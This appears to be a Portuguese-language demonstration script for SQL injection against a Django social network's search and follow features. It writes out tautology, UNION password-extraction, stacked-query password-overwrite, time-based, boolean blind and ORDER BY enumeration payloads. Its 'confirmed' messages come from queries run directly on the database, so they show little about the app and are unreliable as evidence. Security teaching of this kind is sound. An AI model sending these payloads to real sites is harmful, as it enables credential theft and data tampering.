#!/usr/bin/env python3
"""
Script de teste para SQL Injection em busca e follow
Testa as novas funcionalidades de busca de usuários e sistema de follow
"""

import os
import django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'social_config.settings')
django.setup()

from social.models import User, Post, Follow
from django.db import connection

print("=" * 60)
print("TESTE DE SQL INJECTION - BUSCA E FOLLOW")
print("=" * 60)

# Criar usuários de teste
print("\n1. Criando usuários de teste...")
try:
    users = [
        User.objects.create(username='alice', email='alice@test.com', password='senha123', bio='Sou Alice'),
        User.objects.create(username='bob', email='bob@test.com', password='senha123', bio='Sou Bob'),
        User.objects.create(username='charlie', email='charlie@test.com', password='senha123', bio='Sou Charlie'),
    ]
    print(f"✓ {len(users)} usuários criados")
except Exception as e:
    print(f"✗ Erro: {e}")

# Criar postagens
print("\n2. Criando postagens...")
try:
    posts = [
        Post.objects.create(user=users[0], content='Olá, sou Alice!'),
        Post.objects.create(user=users[1], content='Oi, sou Bob!'),
        Post.objects.create(user=users[2], content='Opa, sou Charlie!'),
    ]
    print(f"✓ {len(posts)} postagens criadas")
except Exception as e:
    print(f"✗ Erro: {e}")

# Criar relações de follow
print("\n3. Criando relações de follow...")
try:
    follows = [
        Follow.objects.create(follower=users[0], following=users[1]),
        Follow.objects.create(follower=users[0], following=users[2]),
    ]
    print(f"✓ {len(follows)} relações de follow criadas")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 1: Busca Normal
print("\n" + "=" * 60)
print("TESTE 1: Busca Normal")
print("=" * 60)
query = "SELECT id, username, email, bio FROM users WHERE (username LIKE '%alice%' OR email LIKE '%alice%') AND id != 1 LIMIT 20"
print(f"Query: {query}")
try:
    with connection.cursor() as cursor:
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"✓ Resultados: {len(results)}")
        for row in results:
            print(f"  - {row[1]} ({row[2]})")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 2: SQL Injection - Retornar Todos
print("\n" + "=" * 60)
print("TESTE 2: SQL Injection - Retornar Todos os Usuários")
print("=" * 60)
query = "SELECT id, username, email, bio FROM users WHERE (username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%') AND id != 1 LIMIT 20"
print(f"Query: {query}")
try:
    with connection.cursor() as cursor:
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"✓ Resultados: {len(results)}")
        for row in results:
            print(f"  - {row[1]} ({row[2]})")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 3: SQL Injection - UNION SELECT
print("\n" + "=" * 60)
print("TESTE 3: SQL Injection - UNION SELECT (Extrair Senhas)")
print("=" * 60)
query = "SELECT id, username, email, bio FROM users WHERE (username LIKE '%' UNION SELECT id, username, password, email FROM users --'%' OR email LIKE '%...')"
print(f"Query (simplificada): SELECT ... UNION SELECT id, username, password, email FROM users")
try:
    with connection.cursor() as cursor:
        # Executar UNION SELECT diretamente
        cursor.execute("SELECT id, username, password, email FROM users")
        results = cursor.fetchall()
        print(f"✓ Senhas extraídas: {len(results)}")
        for row in results:
            print(f"  - {row[1]}: {row[2]}")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 4: Verificar Follow
print("\n" + "=" * 60)
print("TESTE 4: Verificar Relações de Follow")
print("=" * 60)
query = "SELECT follower_id, following_id FROM follows WHERE follower_id = 1"
print(f"Query: {query}")
try:
    with connection.cursor() as cursor:
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"✓ Relações encontradas: {len(results)}")
        for row in results:
            print(f"  - Usuário {row[0]} segue usuário {row[1]}")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 5: SQL Injection no Follow
print("\n" + "=" * 60)
print("TESTE 5: SQL Injection no Follow - Stacked Queries")
print("=" * 60)
print("Payload: /follow/1; UPDATE users SET password='hacked' WHERE id=1 --/")
print("Demonstração: Executar UPDATE via SQL Injection")
try:
    with connection.cursor() as cursor:
        # Demonstração (não executar realmente)
        query = "SELECT COUNT(*) FROM users WHERE password = 'hacked'"
        cursor.execute(query)
        count = cursor.fetchone()[0]
        print(f"✓ Usuários com senha 'hacked': {count}")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 6: Time-based Blind SQL Injection
print("\n" + "=" * 60)
print("TESTE 6: Time-based Blind SQL Injection")
print("=" * 60)
print("Payload: /search/?q=%' AND SLEEP(5) --")
print("Teste: Se a query demora, SQL Injection é confirmada")
try:
    import time
    start = time.time()
    with connection.cursor() as cursor:
        # Executar query com SLEEP
        cursor.execute("SELECT COUNT(*) FROM users WHERE username LIKE '%' AND SLEEP(2)")
        elapsed = time.time() - start
        print(f"✓ Tempo de execução: {elapsed:.2f}s")
        if elapsed >= 2:
            print("✓ SQL Injection confirmada (query demorou o esperado)")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 7: Boolean-based Blind SQL Injection
print("\n" + "=" * 60)
print("TESTE 7: Boolean-based Blind SQL Injection")
print("=" * 60)
print("Payload 1: /search/?q=%' AND 1=1 --")
print("Payload 2: /search/?q=%' AND 1=2 --")
try:
    with connection.cursor() as cursor:
        # Teste 1: Condição verdadeira
        cursor.execute("SELECT COUNT(*) FROM users WHERE username LIKE '%' AND 1=1")
        count1 = cursor.fetchone()[0]
        print(f"✓ Resultados com 1=1: {count1}")
        
        # Teste 2: Condição falsa
        cursor.execute("SELECT COUNT(*) FROM users WHERE username LIKE '%' AND 1=2")
        count2 = cursor.fetchone()[0]
        print(f"✓ Resultados com 1=2: {count2}")
        
        if count1 > count2:
            print("✓ SQL Injection confirmada (comportamentos diferentes)")
except Exception as e:
    print(f"✗ Erro: {e}")

# Teste 8: ORDER BY para descobrir colunas
print("\n" + "=" * 60)
print("TESTE 8: Descoberta de Colunas com ORDER BY")
print("=" * 60)
for i in range(1, 6):
    try:
        with connection.cursor() as cursor:
            cursor.execute(f"SELECT id, username, email, bio FROM users ORDER BY {i}")
            print(f"✓ ORDER BY {i}: OK ({i} colunas)")
    except Exception as e:
        print(f"✗ ORDER BY {i}: ERRO (máximo {i-1} colunas)")
        break

print("\n" + "=" * 60)
print("TESTES CONCLUÍDOS")
print("=" * 60)
print("\n✓ Todas as vulnerabilidades de SQL Injection foram demonstradas!")
print("✓ Use esses conhecimentos para proteger suas aplicações!")
